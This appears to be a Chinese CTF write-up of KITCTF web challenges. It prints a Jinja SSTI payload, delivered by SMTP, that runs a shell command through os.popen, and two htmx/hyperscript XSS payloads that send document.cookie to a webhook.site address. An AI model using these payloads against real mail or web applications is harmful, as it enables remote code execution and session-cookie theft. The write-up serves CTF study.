
# web
### Wanky Mail
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230610204423.png)
访问根目录随机生成一个字符串邮箱,并重定向到 `/base58()` 
可以给他发邮件
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230610205346.png)
可以接收邮件,,,

思路一
> 发送一段ssti,render达成rce

```python
def render_emails(address):
    id = 0
    render = """
    <table>
        <tr>
            <th id="th-left">From</th>
            <th>Subject</th>
            <th id="th-right">Date</th>
        </tr>
    """
    overlays = ""
    m = mails[address].copy()
    for email in m:

        render += f"""
        <tr id="{id}">
            <td>{email['sender']}</td>
            <td>{email['subject']}</td>
            <td>{email['timestamp']}</td>
        </tr>
        """
        overlays += f"""
        <div id="overlay-{id}" class="overlay">
            <div class="email-details">
                <h1>{email['subject']} - from: {email['sender']} to {email['rcpt']}</h1>
                <p>{email['body']}</p>
            </div>
        </div>
        """
        id +=1
    render += "</table>"
    render += overlays
    return render
```

用qq邮箱发送的数据会base64,google不会,但是失败了

---
确实是ssti,但要使用python的smb模块发送,防止被转义

*payload*
```python
import smtplib

payload = "{% endraw %}{{ lipsum.__globals__['os'].popen('cat flag*').read() }}{% raw %}"

smtplib.SMTP('webmail-0.chals.kitctf.de',8025).sendmail(
    'vozec@vuln.fr', 
    'olbqwhaekesl@webmail-0.chals.kitctf.de',
    payload
)
```

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230615194248.png)

### cross-site-python
---
复现时题目环境失效了,docker重新搭一下

### Web-Admin


### Notian
可以添加笔记,但是js代码没有执行
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230615202546.png)

`<body>`标签开启了`data-disable-scripting`,需要我们bypass

---
*payload1*
```html
  <meta name="htmx-config" content='{"disableSelector":"[lol-no]"}'>
    <div _="on intersection(intersecting) put 'https://webhook.site/ddb8754d-41c5-42d4-a8af-d1944274993f?' + document.cookie into location.href"></div>
    <script src="/resources/js/htmx.min.js"></script>
    <script src="/resources/js/hyperscript.min.js"></script>
```

*payload2*
```html
<form method="get" action="https://webhook.site/ddb8754d-41c5-42d4-a8af-d1944274993f">
    <input id="payload" type="text" name="username" placeholder="Username">
    <button type="submit" value="Register">
</form>
<script src="/resources/js/htmx.min.js"></script>
<script src="/resources/js/hyperscript.min.js"></script>

<html lang="en" _="on load log 'foo' 
    then set #payload.value to body.ownerDocument.location.href + '---' + body.ownerDocument.cookie
    then call body.ownerDocument.forms[0].submit()">
</html>
```
# reverse

# pwn

# crypto

# Misc


---
## *相关wp*




2023-06-10   20:35